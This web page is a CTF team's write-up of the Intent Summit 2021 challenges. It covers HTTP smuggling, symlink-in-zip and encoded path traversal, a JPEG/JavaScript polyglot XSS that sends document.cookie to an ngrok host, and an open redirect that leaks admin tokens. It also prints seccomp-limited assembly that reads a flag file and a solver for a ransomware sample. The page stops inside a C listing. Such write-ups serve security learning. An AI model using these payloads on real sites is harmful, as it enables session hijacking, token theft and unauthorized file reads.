<!doctype html><html lang=en>
<head>
<title>Intent Summit 2021 CTF :: havce ctf team</title>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=description content="A fun CTF where we came in eighth out of 90 teams! We focussed mainly on web and rev/pwn challenges. It was really fun!">
<meta name=keywords content="ctf,cybersecurity,unipr,hack">
<meta name=robots content="noodp">
<link rel=canonical href=/writeups/intent-summit-2021/>
<link rel=stylesheet href=/assets/style.css>
<link rel=stylesheet href=/assets/green.css>
<link rel=apple-touch-icon href=/img/apple-touch-icon-192x192.png>
<link rel="shortcut icon" href=/img/favicon/green.png>
<meta name=twitter:card content="summary">
<meta name=twitter:site content="havce_ctf">
<meta name=twitter:creator content="havce">
<meta property="og:locale" content="en">
<meta property="og:type" content="article">
<meta property="og:title" content="Intent Summit 2021 CTF">
<meta property="og:description" content="A fun CTF where we came in eighth out of 90 teams! We focussed mainly on web and rev/pwn challenges. It was really fun!">
<meta property="og:url" content="/writeups/intent-summit-2021/">
<meta property="og:site_name" content="havce ctf team">
<meta property="og:image" content="/img/favicon/green.png">
<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">
<meta property="article:published_time" content="2021-11-16 21:36:08 +0100 +0100">
</head>
<body class=green>
<div class="container center headings--one-size">
<header class=header>
<div class=header__inner>
<div class=header__logo>
<a href=/>
<div class=logo>
havce
</div>
</a>
</div>
<div class=menu-trigger>menu</div>
</div>
<nav class=menu>
<ul class="menu__inner menu__inner--desktop">
<li><a href=/>Home</a></li>
<li><a href=/writeups/>Writeups</a></li>
<li><a href=/members/>Members</a></li>
<li><a href=/about/>About</a></li>
</ul>
<ul class="menu__inner menu__inner--mobile">
<li><a href=/>Home</a></li>
<li><a href=/writeups/>Writeups</a></li>
<li><a href=/members/>Members</a></li>
<li><a href=/about/>About</a></li>
</ul>
</nav>
</header>
<div class=content>
<div class=post>
<h1 class=post-title>
<a href=/writeups/intent-summit-2021/>Intent Summit 2021 CTF</a></h1>
<div class=post-meta>
<span class=post-date>
2021-11-16
[Updated: 2021-11-16]
</span>
<span class=post-author>:: havce</span>
</div>
<span class=post-tags>
#<a href=/tags/pwn/>pwn</a>&nbsp;
#<a href=/tags/rev/>rev</a>&nbsp;
#<a href=/tags/web/>web</a>&nbsp;
#<a href=/tags/intent/>intent</a>&nbsp;
#<a href=/tags/bot/>bot</a>&nbsp;
</span>
<div class=post-content><div>
<table>
<thead>
<tr>
<th>Challenge</th>
<th>Category</th>
<th>Points</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href=#door-unlocked>Door (un)Locked</a></td>
<td><a href=/tags/web/>web</a></td>
<td>100</td>
</tr>
<tr>
<td><a href=#careers>Careers</a></td>
<td><a href=/tags/web/>web</a></td>
<td>100</td>
</tr>
<tr>
<td><a href=#graphics>GraphiCS</a></td>
<td><a href=/tags/web/>web</a></td>
<td>150</td>
</tr>
<tr>
<td><a href=#etulosba>Etulosba</a></td>
<td><a href=/tags/web/>web</a></td>
<td>200</td>
</tr>
<tr>
<td><a href=#darknet-club>Darknet Club</a></td>
<td><a href=/tags/web/>web</a></td>
<td>200</td>
</tr>
<tr>
<td><a href=#flag-vault>Flag Vault</a></td>
<td><a href=/tags/web/>web</a></td>
<td>250</td>
</tr>
<tr>
<td><a href=#mass-notes>Mass Notes</a></td>
<td><a href=/tags/web/>web</a></td>
<td>250</td>
</tr>
<tr>
<td><a href=#pattern-institute>Pattern Institute</a></td>
<td><a href=/tags/pwn/>pwn</a></td>
<td>450</td>
</tr>
<tr>
<td><a href=#scadomware>Scadomware</a></td>
<td><a href=/tags/rev/>rev</a></td>
<td>300</td>
</tr>
<tr>
<td><a href=#electron>Electron</a></td>
<td><a href=/tags/bot/>bot</a></td>
<td>50</td>
</tr>
</tbody>
</table>
<h1 id=door-unlocked>Door (un)Locked<a href=#door-unlocked class=hanchor arialabel=Anchor>&#8983;</a> </h1>
<blockquote>
<p>Some researchers started deploying a website for their CTF, but something went wrong with the defined policies when trying to hide the flags.
Can you find the weak link?</p>
</blockquote>
<p><strong>Description</strong></p>
<p>This challenge presents a plain static website and an attachment called <code>ha.cfg</code>, which is the config file for <a href=http://www.haproxy.org/>HAProxy</a>. In the file there are two interesting entries:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext>http-request deny if { path_beg /flag }
http-request deny if { path,url_dec -m reg ^.*/?flag/?.*$ }
</code></pre></div><p>We can guess that the flag is hidden behind the <code>/flag</code> endpoint.</p>
<p><strong>Solution</strong></p>
<p>My first approach was to try and break the regex, with disappointing results. I then educated myself on <a href=https://portswigger.net/web-security/request-smuggling>HTTP Smuggling attacks</a>. And guess what?! HAProxy version &lt; 2.0.25, 2.2.17, 2.3.14 and 2.4.4 are vulnerable to an <a href=https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/>Integer Overflow attack</a> that enables HTTP Smuggling!</p>
<p>After a few unfortunate manual takes, I used <a href=https://github.com/alikarimi999/CVE-2021-40346/blob/main/exploit.py>this tool</a> which worked like a charm.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext>...
HTTP/1.1 200 OK
server: nginx/1.21.4
date: Wed, 17 Nov 2021 00:09:42 GMT
content-type: text/html
content-length: 29
last-modified: Fri, 12 Nov 2021 20:51:37 GMT
etag: &#34;618ed3d9-1d&#34;
accept-ranges: bytes

INTENT{Smuggl3_w1th_H4_Pr0xy}
</code></pre></div><h1 id=careers>Careers<a href=#careers class=hanchor arialabel=Anchor>&#8983;</a> </h1>
<blockquote>
<p>We got hacked,
we&rsquo;re trying to indentify the ROOT cause.
If you are a l33t h4x0r, please upload your resume.</p>
</blockquote>
<p><strong>Description</strong></p>
<p>The attached URL brings us to a website which has a <em>Careers</em> section, where we can upload our r√©sum√© in .txt format, zipped. We are pretty sure we need to tinker with this upload form in order to get our flag.</p>
<p><strong>Solution</strong></p>
<p>Well, first things first, when we deal with upload forms and zips, I always try to add - let&rsquo;s say - <em>interesting</em> files to my compressed archive.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># Let&#39;s try the oldest trick in the book</span>
ln -fs ../../../../../flag havce.txt
zip --symlinks havce.zip havce.txt
</code></pre></div><p>Let&rsquo;s apply to this job with this resume. ü§≠</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>INTENT<span style=color:#f92672>{</span>zipfiles_are_awsome_for_pt<span style=color:#f92672>}</span>
</code></pre></div><h1 id=graphics>GraphiCS<a href=#graphics class=hanchor arialabel=Anchor>&#8983;</a> </h1>
<blockquote>
<p>What is your problem?
How didn&rsquo;t you approve my beautiful innovative page on your &ldquo;precious&rdquo; CTF?!
It&rsquo;s all done, maybe I can just add some graphics.</p>
</blockquote>
<p><strong>Description</strong></p>
<p>The challenge presents a website that makes a single query to a GraphQL endpoint. We probably need to extract the flag from there.</p>
<p><strong>Solution</strong></p>
<p>Immediately tried introspection, but it was disabled. Luckily we can abuse the autocorrection feature and this tool: <a href=https://github.com/nikitastupin/clairvoyance/>https://github.com/nikitastupin/clairvoyance/</a>, using a decent word list will reveal that we can use this query to get the flag:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{<span style=color:#f92672>&#34;operationName&#34;</span>:<span style=color:#e6db74>&#34;ExampleQuery&#34;</span>,<span style=color:#f92672>&#34;variables&#34;</span>:{},<span style=color:#f92672>&#34;query&#34;</span>:<span style=color:#e6db74>&#34;query ExampleQuery { _secret { flag } }\n&#34;</span>}
</code></pre></div><h1 id=etulosba>Etulosba<a href=#etulosba class=hanchor arialabel=Anchor>&#8983;</a> </h1>
<blockquote>
<p>Our spy managed to steal the source code for the Etulosba CDN. We need your help to get the flag from that server.</p>
</blockquote>
<p><strong>Description</strong></p>
<p>We are provided with the source code of what supposedly is a CDN:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>fs</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#34;fs&#34;</span>);
<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>path</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#34;path&#34;</span>);
<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>express</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#34;express&#34;</span>);

<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>server</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>express</span>();

<span style=color:#a6e22e>server</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;/&#34;</span>, <span style=color:#66d9ef>function</span> (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) {
    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>end</span>(<span style=color:#e6db74>&#34;&lt;html&gt;&lt;body&gt;etulosba&lt;/body&gt;&lt;/html&gt;&#34;</span>);
});

<span style=color:#a6e22e>server</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;/files/images/:name&#34;</span>, <span style=color:#66d9ef>function</span> (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) {
    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>params</span>.<span style=color:#a6e22e>name</span>.<span style=color:#a6e22e>indexOf</span>(<span style=color:#e6db74>&#34;.&#34;</span>) <span style=color:#f92672>===</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) {
        <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>400</span>).<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>error</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;invalid file name&#34;</span> });
    }

    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>sendFile</span>(<span style=color:#a6e22e>__dirname</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>path</span>.<span style=color:#a6e22e>join</span>(<span style=color:#e6db74>&#34;/files/images/&#34;</span>, <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>params</span>.<span style=color:#a6e22e>name</span>));
});

<span style=color:#a6e22e>server</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;/files/binary/:name&#34;</span>, <span style=color:#66d9ef>function</span> (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) {
    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>params</span>.<span style=color:#a6e22e>name</span>.<span style=color:#a6e22e>indexOf</span>(<span style=color:#e6db74>&#34;.&#34;</span>) <span style=color:#f92672>!==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) {
        <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>400</span>).<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>error</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;invalid file name&#34;</span> });
    }

    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>sendFile</span>(<span style=color:#a6e22e>path</span>.<span style=color:#a6e22e>resolve</span>(<span style=color:#a6e22e>__dirname</span>, <span style=color:#e6db74>&#34;/files/binary/&#34;</span>, <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>params</span>.<span style=color:#a6e22e>name</span>));
});

<span style=color:#a6e22e>fs</span>.<span style=color:#a6e22e>writeFileSync</span>(<span style=color:#a6e22e>path</span>.<span style=color:#a6e22e>join</span>(<span style=color:#a6e22e>__dirname</span>, <span style=color:#e6db74>&#34;flag.name&#34;</span>), <span style=color:#a6e22e>process</span>.<span style=color:#a6e22e>env</span>.<span style=color:#a6e22e>FLAG_NAME</span>);
<span style=color:#a6e22e>fs</span>.<span style=color:#a6e22e>writeFileSync</span>(<span style=color:#a6e22e>path</span>.<span style=color:#a6e22e>join</span>(<span style=color:#e6db74>&#34;/tmp&#34;</span>, <span style=color:#a6e22e>process</span>.<span style=color:#a6e22e>env</span>.<span style=color:#a6e22e>FLAG_NAME</span>), <span style=color:#a6e22e>process</span>.<span style=color:#a6e22e>env</span>.<span style=color:#a6e22e>FLAG</span>);

<span style=color:#a6e22e>server</span>.<span style=color:#a6e22e>listen</span>(<span style=color:#a6e22e>process</span>.<span style=color:#a6e22e>env</span>.<span style=color:#a6e22e>HTTP_PORT</span>);
</code></pre></div><p><strong>Solution</strong></p>
<p>By quickly looking at the code we can see the usage of <code>path.join</code> and <code>path.resolve</code> with user input which can be quite dangerous. Indeed the two endpoints provide two vulnerabilities: we can first read the <code>flag.name</code> file by requesting <code>https://etulosba.chal.intentsummit.org/files/images/%2E%2E%2F%2E%2E%2Fflag%2Ename</code> and then query it&rsquo;s contents with <code>https://etulosba.chal.intentsummit.org/files/binary/%2Ftmp%2Fimaflagimaflag</code></p>
<h1 id=darknet-club>Darknet Club<a href=#darknet-club class=hanchor arialabel=Anchor>&#8983;</a> </h1>
<blockquote>
<p>There is a new invite system for the most exclusive darknet websites.
Can you help me get an in?</p>
</blockquote>
<p><strong>Description</strong></p>
<p>The challenge let us register an account and then present us a simple profile page with the ability to ask the &ldquo;admin&rdquo; to review our profile. This looked like an XSS challenge.</p>
<p><strong>Solution</strong></p>
<p>First we checked all inputs to see whether they were sanitized and indeed the referral input wasn&rsquo;t. I quickly tried an XSS payload to steal the admin&rsquo;s cookies, but realized CSP was enabled and that we needed some other way. At that point I realized I could upload a profile picture, but that required a JPEG file which appeared to be checked for the magic bytes only. At this point the route was clear:</p>
<ol>
<li>Upload a &ldquo;valid&rdquo; JPEG file that&rsquo;s also a malicious JS script:</li>
</ol>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=color:#a6e22e>√ø√ò√ø√Æ</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
<span style=color:#a6e22e>location</span>.<span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;//xxxx-xx-xx-xx-xx.ngrok.io?cookies=&#34;</span><span style=color:#f92672>+</span>document.<span style=color:#a6e22e>cookie</span>;
</code></pre></div><ol start=2>
<li>Set the referral to load the image as the script:</li>
</ol>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&lt;<span style=color:#f92672>script</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;https://darknet-club.chal.intentsummit.org/api/avatar/havce_test&#34;</span>&gt;&lt;/<span style=color:#f92672>script</span>&gt;
</code></pre></div><ol start=3>
<li>Request a review by the admin</li>
</ol>
<h1 id=flag-vault>Flag Vault<a href=#flag-vault class=hanchor arialabel=Anchor>&#8983;</a> </h1>
<blockquote>
<p>We found a publicly accessible Flag Vault server. Can you find a way to steal the flag from the site admin?</p>
</blockquote>
<p><strong>Description</strong></p>
<p>The challenge contains a simple login page that seems to never login and is not vulnerable to basic SQLi. JWT tokens also look same after a bit of fuzzing.</p>
<p><strong>Solution</strong></p>
<p>The report button suggests we probably need to send a malicious URL to the &ldquo;admin&rdquo;. Seems easy, but it appears to check the domain of the URL to be the same of website the challenge is on. Upon visiting <code>/admin</code>, we are redirected to <code>/?redirect=/admin&error=INVALID_TOKEN</code> which probably means we will be redirect to the given URL upon successful login (something we cannot test). Checking the redirect login we can see it&rsquo;s not very safe:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript>window.<span style=color:#a6e22e>location</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>location</span>.<span style=color:#a6e22e>origin</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>redirectTo</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;?token=&#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>jsonData</span>.<span style=color:#a6e22e>token</span>;
</code></pre></div><p>Because it is done with simple concatenation we can use the <code>@</code> trick to fool the admin&rsquo;s browser into redirecting him to a malicious link with the token as a query parameter when he logs in (which he does!):</p>
<p><a href="https://flag-vault.chal.intentsummit.org/?redirect=@xxxx-xx-xx-xx-xx.ngrok.io/">https://flag-vault.chal.intentsummit.org/?redirect=@xxxx-xx-xx-xx-xx.ngrok.io/</a></p>
<p>After receiving the token, which expires in 10 seconds, we can quickly login and get the flag.</p>
<h1 id=mass-notes>Mass Notes<a href=#mass-notes class=hanchor arialabel=Anchor>&#8983;</a> </h1>
<blockquote>
<p>We know the flag is on the Mass Notes servers, can you get it for us?</p>
</blockquote>
<p><strong>Description</strong></p>
<p>The app simply lets us create notes which are stored on a MongoDB server. I spent a lot of time investigating a possible MongoDB injection, but that wasn&rsquo;t it (sort of).</p>
<p><strong>Solution</strong></p>
<p>A common problem with MongoDB (and NoSQL) implementations is being able to override parameters set in the code with ones of our choice. We can override a couple, but most notably <code>avatar</code>. By messing with a bit, we can see that the avatar for our notes is not visible anymore and that an error is returned instead. <code>../../flag</code> appears to be a good avatar to get the flag!</p>
<h1 id=pattern-institute>Pattern Institute<a href=#pattern-institute class=hanchor arialabel=Anchor>&#8983;</a> </h1>
<blockquote>
<p>It is you against the Pattern Institute!</p>
<p>However, Pattern Institute know what they&rsquo;re up against, so they shut down all their systems, except a sandboxed one, in which they allow only limited operations for their operatives to run.</p>
<p>Our researchers were able to gain hold of the sandbox source code and chain some cool vulnerabilities in Pattern Institute&rsquo;s sandbox, to eventualy get an arbitrary binary to run on that system! but it&rsquo;s been a long time since they&rsquo;ve played in the sand.</p>
<p>Your job is to steal an important file from their system&rsquo;s /home folder and report its contents back to headquarters.</p>
</blockquote>
<p><strong>Description</strong></p>
<p>The challenge attachments included the URL of the remote server and a Go program which constituted the sandbox.</p>
<p>We can execute code on the machine but only a few syscalls are permitted! All the other ones are blocked through a seccomp filter.</p>
<p><em>Allowed</em> syscalls:</p>
<ul>
<li>mmap</li>
<li>mprotect</li>
<li>write</li>
<li>open</li>
<li>close</li>
<li>fstat</li>
<li>execve</li>
<li>arch_prctl</li>
<li>stat</li>
<li>futex</li>
<li>exit_group</li>
</ul>
<p>From the challenge description we can guess that we need to exfiltrate <code>/home/flag.txt</code>.</p>
<p><strong>Solution</strong></p>
<p>My first try was to write a C program that used <code>open</code>, <code>read</code> and <code>write</code>, but libc implements the <code>open</code> function with the <code>openat</code> syscall, so I cried in <code>SIGSEGV</code> and decided to try to write something in amd64 assembly.</p>
<p>So I started to write an asm program that:</p>
<ul>
<li><code>open</code>-ed the file (<code>/home/flag.txt</code>)</li>
<li><code>read</code>-ed the file (yes, I know)</li>
<li><code>write</code>-ed the file to stdout.</li>
</ul>
<p>Simple, elegant and linear, it worked on my machine‚Ñ¢Ô∏è but not on the remote one!
It took me a while (and a Discord message from Gianluca) to realize that the <code>read</code> syscall was blocked. Bummer.</p>
<p>From this point on Gianluca took over and the program now:</p>
<ul>
<li><code>open</code>-ed the file</li>
<li>allocated the <code>stat</code> struct on the stack</li>
<li>called <code>fstat</code> syscall</li>
<li><code>mmap</code>-ed the file descriptor of the file previously opened to a random place on memory.</li>
<li><code>write</code>-ed to stdout the content of the mapping (the file content, i.e. the flag).</li>
</ul>
<pre tabindex=0><code class="language-x86asm=amd64" data-lang="x86asm=amd64">global _start

section .text

_start:

  mov     rax, 2          ; &quot;open&quot;
  mov     rdi, path       ;
  xor     rsi, rsi        ; O_RDONLY
  syscall

  mov     rdi, rax        ; fd (returned from open)
  sub     rsp, 144        ; allocate stat struct
  mov     rsi, rsp        ; address of 'struct stat'
  mov     rax, 5          ; &quot;fstat&quot; syscall
  syscall

  mov     rsi, [rsp+48]   ; len = file size (from 'struct stat')
  add     rsp, 144        ; free 'struct stat'
  mov     r8, rdi         ; fd (still in rdi from last syscall)
  xor     rdi, rdi        ; address = 0
  mov     rdx, 0x1        ; protection = PROT_READ
  mov     r10, 0x2        ; flags = MAP_PRIVATE
  xor     r9, r9          ; offset = 0
  mov     rax, 9          ; &quot;mmap&quot; syscall
  syscall

  mov     rdx, rsi        ; count (file size from last call)
  mov     rsi, rax        ; buffer address (returned from mmap)
  mov     rdi, 1          ; fd = stdout
  mov     rax, 1          ; &quot;write&quot; syscall
  syscall

  mov rax, 231      ;
  mov rdi, 0        ;   EXIT_SUCCESS
  syscall           ; );

section .rodata
  path: db &quot;/home/flag.txt&quot;,0
</code></pre><p>Compile and link with:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>nasm -f elf64 -o exploit.o exploit.asm
ld -o exploit exploit.o
</code></pre></div><p>To launch the exploit we needed to convert the binary to base64 and add it to the challenge website query string.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> base64
<span style=color:#f92672>import</span> urllib.parse

<span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;exploit&#39;</span>, <span style=color:#e6db74>&#39;rb&#39;</span>) <span style=color:#66d9ef>as</span> f:
    content <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>read()

payload <span style=color:#f92672>=</span> base64<span style=color:#f92672>.</span>b64encode(content)<span style=color:#f92672>.</span>decode()
payload <span style=color:#f92672>=</span> urllib<span style=color:#f92672>.</span>parse<span style=color:#f92672>.</span>quote(payload)
print(<span style=color:#e6db74>&#34;http://patterni.chal.intentsummit.org:9090/?arg=&#34;</span><span style=color:#f92672>+</span>payload)
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext>INTENT{pl4y1n6_1n_7h3_54nd_15_d4n63r0u5}
</code></pre></div><h1 id=scadomware>Scadomware<a href=#scadomware class=hanchor arialabel=Anchor>&#8983;</a> </h1>
<blockquote>
<p>Someone hacked my OT network and dropped a ransomware! plz h3lp me recover this encrypted file!</p>
</blockquote>
<p><strong>Description</strong></p>
<p>We are provided a sample of a ransomware and an encrypted file. Our task is to decrypt such file.</p>
<p><strong>Solution</strong></p>
<p>The executable main function is to enumerate files and encrypt them all. The encryption is done with AES/CBC the IV is fixed in the code and the key is the SHA1 of some string which is the concatenation of:</p>
<ul>
<li>A generated static string <code>YouTakeTheRedPillYouStayInWonderlandAndIShowYouHowDeepTheRabbitHoleGoes</code></li>
<li><code>0mgisthebestg</code></li>
<li>A number contained in the encrypt file from 10-14 bytes in hex</li>
<li>The original file size contained in the encrypted file from 6-10 bytes</li>
<li><code>---</code></li>
<li>The int checksum of the computer physical address (which we don&rsquo;t know)</li>
</ul>
<p>Be ware that the SHA1 output length isn&rsquo;t enough for the AES key and therefore some of it is initialized with a simple function. The solve script is as follows:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> hashlib

<span style=color:#f92672>from</span> Crypto.Cipher <span style=color:#f92672>import</span> AES
<span style=color:#f92672>from</span> Crypto.Util.Padding <span style=color:#f92672>import</span> unpad
<span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> bytes_to_long

<span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;important.intent.enc&#39;</span>, <span style=color:#e6db74>&#39;rb&#39;</span>) <span style=color:#66d9ef>as</span> f:
    encrypted_file <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>read()
    original_size <span style=color:#f92672>=</span> bytes_to_long(encrypted_file[<span style=color:#ae81ff>6</span>:<span style=color:#ae81ff>10</span>][::<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>])
    big_num <span style=color:#f92672>=</span> bytes_to_long(encrypted_file[<span style=color:#ae81ff>10</span>:<span style=color:#ae81ff>14</span>][::<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>])
    encrypted_file <span style=color:#f92672>=</span> encrypted_file[<span style=color:#ae81ff>14</span>:<span style=color:#f92672>-</span><span style=color:#ae81ff>4</span>]


<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>decrypt</span>(ip_int):
    hash_input <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;</span><span style=color:#e6db74>{0:}</span><span style=color:#e6db74>0mgisthebestg</span><span style=color:#e6db74>{1:08x}{2:}</span><span style=color:#e6db74>---</span><span style=color:#e6db74>{3:}</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>.</span>format(
        <span style=color:#e6db74>&#39;YouTakeTheRedPillYouStayInWonderlandAndIShowYouHowDeepTheRabbitHoleGoes&#39;</span>, big_num, original_size, ip_int)
    hash_bytes <span style=color:#f92672>=</span> hashlib<span style=color:#f92672>.</span>sha1(hash_input<span style=color:#f92672>.</span>encode())<span style=color:#f92672>.</span>digest()

    aes_key <span style=color:#f92672>=</span> bytearray([<span style=color:#ae81ff>0</span>] <span style=color:#f92672>*</span> <span style=color:#ae81ff>32</span>)
    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>32</span>):
        aes_key[i] <span style=color:#f92672>=</span> (i <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x5b</span>) <span style=color:#f92672>%</span> <span style=color:#ae81ff>256</span>

    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(len(hash_bytes)):
        aes_key[i] <span style=color:#f92672>=</span> hash_bytes[i]

    cipher <span style=color:#f92672>=</span> AES<span style=color:#f92672>.</span>new(bytes(aes_key), AES<span style=color:#f92672>.</span>MODE_CBC, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;0010000300003007&#39;</span>)
    out <span style=color:#f92672>=</span> unpad(cipher<span style=color:#f92672>.</span>decrypt(encrypted_file), <span style=color:#ae81ff>16</span>)
    print(out<span style=color:#f92672>.</span>decode())


<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
    ip_int <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
    <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
        <span style=color:#66d9ef>try</span>:
            decrypt(ip_int)
            <span style=color:#66d9ef>break</span>
        <span style=color:#66d9ef>except</span>:
            <span style=color:#66d9ef>pass</span>

        ip_int <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>


<span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
    main()
</code></pre></div><p>To generate the static string I used this C program, mainly copy-pasted from the decompiler:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>  <span style=color:#a6e22e>calcPass</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>input1,<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>input2)
{
  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>pbVar1;
  <span style=color:#66d9ef>char</span> cVar2;
  uint outLen;
  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>in2len;
  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>res;
  uint index;
  uint uVar3;

  in2len <span style=color:#f92672>=</span> input1;
  <span style=color:#66d9ef>do</span> {
    cVar2 <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>in2len;
    in2len <span style=color:#f92672>=</span> in2len <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>;
  } <span style=color:#66d9ef>while</span> (cVar2 <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;\0&#39;</span>);
  outLen <span style=color:#f92672>=</span> (<span style=color:#66d9ef>int</span>)in2len <span style=color:#f92672>-</span> (<span style=color:#66d9ef>int</span>)(input1 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>);
  in2len <span style=color:#f92672>=</span> input2;
  <span style=color:#66d9ef>do</span> {
    cVar2 <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>in2len;
    in2len <span style=color:#f92672>=</span> in2len <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>;
  } <span style=color:#66d9ef>while</span> (cVar2 <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;\0&#39;</span>);
